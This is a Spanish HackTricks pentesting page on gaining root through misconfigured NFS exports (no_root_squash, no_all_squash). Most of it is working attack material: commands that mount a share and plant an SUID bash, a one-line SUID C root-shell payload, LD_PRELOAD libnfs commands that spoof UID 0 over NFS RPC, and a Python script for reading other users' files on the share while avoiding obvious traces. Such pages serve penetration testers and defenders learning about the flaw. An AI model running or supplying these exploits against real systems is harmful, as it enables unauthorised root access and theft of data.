Lea el archivo _**/etc/exports**_, si encuentra algún directorio que esté configurado como **no\_root\_squash**, entonces puede **acceder** a él desde **un cliente** y **escribir dentro** de ese directorio **como si fuera** el **root** local de la máquina.

**no\_root\_squash**: Esta opción básicamente da autoridad al usuario root en el cliente para acceder a los archivos en el servidor NFS como root. Y esto puede llevar a graves implicaciones de seguridad.

**no\_all\_squash:** Esto es similar a la opción **no\_root\_squash** pero se aplica a **usuarios no root**. Imagina que tienes una shell como usuario nobody; revisa el archivo /etc/exports; la opción no\_all\_squash está presente; revisa el archivo /etc/passwd; emula un usuario no root; crea un archivo suid como ese usuario (montando usando nfs). Ejecuta el suid como usuario nobody y conviértete en un usuario diferente.

# Escalada de Privilegios

## Exploit Remoto

Si ha encontrado esta vulnerabilidad, puede explotarla:

* **Montando ese directorio** en una máquina cliente, y **copiando como root** dentro de la carpeta montada el binario **/bin/bash** y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, dándole derechos SUID, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Explotación Local

{% hint style="info" %}
Tenga en cuenta que si puede crear un **túnel desde su máquina hasta la máquina víctima, aún puede usar la versión remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
El siguiente truco es en caso de que el archivo `/etc/exports` **indique una dirección IP**. En este caso, no podrá usar en ningún caso el **exploit remoto** y necesitará **abusar de este truco**.\
Otro requisito necesario para que funcione el exploit es que **la exportación dentro de `/etc/export` debe estar usando la bandera `insecure`**.\
\--_No estoy seguro de que si `/etc/export` indica una dirección IP, este truco funcionará_--
{% endhint %}

**Truco copiado de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Ahora, supongamos que el servidor de recursos aún ejecuta `no_root_squash`, pero hay algo que nos impide montar el recurso compartido en nuestra máquina de prueba de penetración. Esto sucedería si `/etc/exports` tiene una lista explícita de direcciones IP permitidas para montar el recurso compartido.

Al listar los recursos compartidos ahora, se muestra que solo la máquina en la que estamos intentando realizar la escalada de privilegios tiene permiso para montarlo:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Esto significa que estamos atrapados explotando el recurso compartido montado en la máquina localmente desde un usuario sin privilegios. Pero resulta que hay otra vulnerabilidad local menos conocida.

Esta vulnerabilidad se basa en un problema en la especificación NFSv3 que establece que es responsabilidad del cliente anunciar su uid/gid al acceder al recurso compartido. ¡Por lo tanto, es posible falsificar el uid/gid mediante la falsificación de las llamadas NFS RPC si el recurso compartido ya está montado!

Aquí hay una [biblioteca que te permite hacer precisamente eso](https://github.com/sahlberg/libnfs).

### Compilando el ejemplo <a href="#compiling-the-example" id="compiling-the-example"></a>

Dependiendo de tu kernel, es posible que necesites adaptar el ejemplo. En mi caso, tuve que comentar las llamadas al sistema fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Explotando usando la librería <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Utilicemos el exploit más simple:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Coloque nuestro exploit en el recurso compartido y hágalo suid root falsificando nuestro uid en las llamadas RPC:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Todo lo que queda es lanzarlo:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
¡Ahí estamos, escalada de privilegios de root local!

## Bonus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Una vez que obtuve el control de root local en la máquina, quise saquear el recurso compartido de NFS en busca de posibles secretos que me permitieran pivotear. Pero había muchos usuarios del recurso compartido, cada uno con su propio UID que no podía leer a pesar de ser root debido a la falta de coincidencia de UID. No quería dejar rastros obvios como un chown -R, así que escribí un pequeño fragmento de código para establecer mi UID antes de ejecutar el comando de shell deseado:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Entonces, puedes ejecutar la mayoría de los comandos como lo harías normalmente, prefijándolos con el script:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
